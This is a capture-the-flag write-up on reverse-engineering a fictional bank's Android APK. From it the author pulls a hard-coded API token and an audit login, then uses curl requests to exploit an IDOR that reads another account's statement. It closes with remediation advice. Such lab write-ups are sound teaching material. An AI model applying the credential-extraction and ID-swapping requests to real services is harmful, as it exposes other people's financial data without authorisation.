# DEADFACE CTF — Hard Kept Secrets: De Monne Financial IDOR

**Category:** Mobile reverse engineering / API authorization  
**Artifact:** `app-release.zip` → `app-release.apk`  
**Package:** `com.demonne.financial`  
**Analyst:** bratxer

## 1. Result

```text
deadface{IDOR_u_2_f1nD_m0r3_Fl4gz}
```

The proof flag is stored in the internal-audit statement for account `1007`:

```text
RESTRICTED — De Monne Financial Internal Audit Division |
Ref: deadface{IDOR_u_2_f1nD_m0r3_Fl4gz} |
All ledger entries verified and reconciled. No discrepancies found.
```

The app exposes an insecure direct object reference (IDOR): an authenticated audit user who owns no accounts can still request records for another account by changing the numeric account ID in the API path.

## 2. Challenge goal

The prompt says DEADFACE can obtain details from nearly any De Monne customer, but does not reveal which user or password they used. We are given a release APK and must recover the flag left as proof.

The important distinction is that strings resembling flags in the APK are not automatically the answer. They must be tied to the intended customer-data access path and verified against the live CTF API.

## 3. Identify and unpack the application

```bash
file /home/arwah/Downloads/app-release.zip
sha256sum /home/arwah/Downloads/app-release.zip
unzip -l /home/arwah/Downloads/app-release.zip
```

The ZIP contains one file:

```text
app-release.apk
```

Archive SHA-256:

```text
5530926b2e564615285d15674ddb21c316f673d7d240f9fcfa36c6afb99f5c0c
```

Extract and identify the APK:

```bash
unzip -p /home/arwah/Downloads/app-release.zip app-release.apk > /tmp/demonne-app-release.apk
file /tmp/demonne-app-release.apk
sha256sum /tmp/demonne-app-release.apk
```

Observed artifact identity:

```text
/tmp/demonne-app-release.apk: Android package (APK)
SHA-256: 59bb5fcde89036724d380554046f1dde1b7b3cddf87059751e9e02bae787a793
```

The APK reports package `com.demonne.financial`, version `2.4.1` (`versionCode` 5), and declares the `INTERNET` permission. Its manifest also permits cleartext network traffic through `android:usesCleartextTraffic="true"`.

## 4. Do not submit the embedded decoys

Searching the DEX files exposes two visible but incorrect flags:

```text
deadface{flaG_ManIfesT3d}
deadface{Ur_N0t_A110wEd_h3r3}
```

The first comes from `com.demonne.financial.internal.DiagnosticActivity`. The Android manifest declares that activity as exported, and the activity builds a diagnostics screen containing:

```text
diagnostic.code : deadface{flaG_ManIfesT3d}
status          : internal build — not for distribution
```

This flag is deliberately labelled as a diagnostic code, rather than customer-data proof.

The second string appears in a static “Q1 2026 Security Verification” document bundled with the application. It calls itself an authorization code and says the document is for authorized internal use. It also does not demonstrate the stated cross-customer data-access weakness.

Both strings are static APK content. The challenge’s intended evidence is in a remote customer-data record reached through the app’s API logic.

## 5. Reverse engineer the API client

The relevant application classes are:

```text
com.demonne.financial.api.ApiClient
com.demonne.financial.api.ApiService
com.demonne.financial.api.AuthInterceptor
com.demonne.financial.api.InternalTokenInterceptor
com.demonne.financial.models.LoginRequest
```

`ApiClient` configures Retrofit with this base URL:

```text
http://dmf.dctf.io:8081/
```

It also hard-codes an internal API token:

```text
zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR
```

`InternalTokenInterceptor` adds it to every API request:

```java
request.newBuilder()
    .header("X-Internal-Token", token)
    .build();
```

`AuthInterceptor` retrieves the logged-in session token and adds it as:

```text
Authorization: Bearer <session token>
```

The Retrofit service defines the following relevant endpoints:

```text
POST /api/auth/login
GET  /api/accounts
GET  /api/accounts/{id}/transactions
GET  /api/accounts/{id}/statements
GET  /api/auth/me
```

The two `{id}` endpoints are the important attack surface. The account ID is supplied directly in the URL, so the API must validate that the authenticated user is authorized to access that particular account.

## 6. Recover usable credentials

The release APK contains a valid audit account and password:

```text
email:    audit@demonne-financial.local
password: demonnefinancial
```

`LoginRequest` confirms that login JSON uses `email` and `password` fields. Authenticate using the headers reproduced from the app:

```bash
internal_token='zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR'

curl -fsS \
  -H "X-Internal-Token: $internal_token" \
  -H 'Content-Type: application/json' \
  --data '{"email":"audit@demonne-financial.local","password":"demonnefinancial"}' \
  http://dmf.dctf.io:8081/api/auth/login
```

The response provides a bearer token and identifies the user as `Audit System`. Its profile message contains another decoy, `deadface{l3FT_b3Hind!}`. This does not satisfy the prompt either: it is a message belonging to the known audit user, not evidence recovered from another customer’s data.

## 7. Confirm the IDOR

First request the audit account’s own account list:

```bash
curl -fsS \
  -H "X-Internal-Token: $internal_token" \
  -H "Authorization: Bearer $session_token" \
  http://dmf.dctf.io:8081/api/accounts
```

Observed output:

```json
[]
```

The account list is empty. The audit user therefore has no account returned by the normal “my accounts” API.

Despite that, the API returns statement data for account `1007` when the account ID in the URL is changed:

```bash
curl -fsS \
  -H "X-Internal-Token: $internal_token" \
  -H "Authorization: Bearer $session_token" \
  http://dmf.dctf.io:8081/api/accounts/1007/statements
```

The record containing the flag is:

```json
{
  "account_id": 1007,
  "id": 4,
  "period": "Q1 2026 Internal Audit Summary",
  "reference": "AUD-2026-Q1-99001",
  "summary": "RESTRICTED — De Monne Financial Internal Audit Division | Ref: deadface{IDOR_u_2_f1nD_m0r3_Fl4gz} | All ledger entries verified and reconciled. No discrepancies found."
}
```

This is direct evidence of an IDOR/BOLA issue:

1. The request is authenticated.
2. The user’s own account-list response is empty.
3. The same user can nevertheless read account `1007` by placing that ID in a path parameter.
4. The returned record contains the CTF’s proof flag.

## 8. Flag

```text
deadface{IDOR_u_2_f1nD_m0r3_Fl4gz}
```

## 9. Security impact and remediation

This is broken object-level authorization (BOLA), often called an IDOR. Authentication answers “who is calling?” Authorization must also answer “is this caller allowed to access this particular account?” The server performed the first check but evidently omitted or mishandled the second one for the account-specific endpoints.

The client-side hard-coded `X-Internal-Token` makes matters worse: anyone who obtains the APK can reproduce the header. Still, removing the token from the application does not fix the core issue. Each server-side account lookup must be scoped to the authenticated principal, for example:

```sql
SELECT ...
FROM statements
WHERE account_id = :requested_account_id
  AND account_id IN (
      SELECT account_id
      FROM account_owners
      WHERE user_id = :authenticated_user_id
  );
```

The API should return an authorization failure for records outside the caller’s scope, keep internal service tokens only in server-controlled systems, and add integration tests that attempt cross-account reads with low-privilege accounts.

## 10. Evidence boundary

All app behavior described from the APK is based on static reverse engineering. The API observations come from authenticated, read-only requests to the supplied DEADFACE CTF endpoint. No customer records were altered, no password guessing was used, and no flag submission was performed during this investigation.
